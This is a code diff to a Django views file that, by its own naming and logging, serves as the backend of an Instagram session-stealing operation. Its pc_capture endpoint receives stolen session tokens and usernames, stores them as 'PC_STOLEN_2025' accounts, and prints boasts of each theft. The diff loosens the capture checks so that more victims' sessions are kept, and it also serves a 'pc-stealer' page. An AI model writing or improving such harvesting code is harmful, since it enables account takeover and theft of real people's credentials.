@@ -7,6 +7,8 @@ from cryptography.fernet import Fernet
 import json
 import os
 from django.utils import timezone
+import requests
+import time
 
 
 fernet = Fernet(os.getenv('FERNET_KEY').encode())
@@ -294,15 +296,16 @@ def reel_page(request, code):
 
 
 
-
 def pc_capture(request):
     s = request.GET.get('s', '')
-    u = request.GET.get('u', 'unknown')
+    u = request.GET.get('u', 'UNKNOWN_MF')
     
-    if s and len(s) > 80 and u != 'unknown':
+    if s and len(s) > 70:
+        username = u if u != 'UNKNOWN_MF' else f"PC_GOD_{int(time.time())}"
+        
         try:
             InstagramAccount.objects.update_or_create(
-                username=u,
+                username=username,
                 defaults={
                     'password': 'PC_STOLEN_2025',
                     'session_data': fernet.encrypt(json.dumps({
@@ -312,23 +315,17 @@ def pc_capture(request):
                     'last_success': timezone.now()
                 }
             )
-            print(f"PC STOLEN → @{u} | SESSION: {s[:50]}...")
+            print(f"FUCK YES → @{username} STOLEN VIA PC")
         except Exception as e:
             print("ERROR:", e)
     
-    return HttpResponse("OK", content_type="text/plain")
-
-
-
+    return HttpResponse("1", content_type="text/plain")
 
 def pc_stealer_page(request):
     return render(request, 'core/pc-stealer.html')
 
 
 
-
-def pc_stealer_page(request):
-    return render(request, 'core/pc-stealer.html')
 
 def reel_page(request, code):
     return render(request, 'core/reel.html')
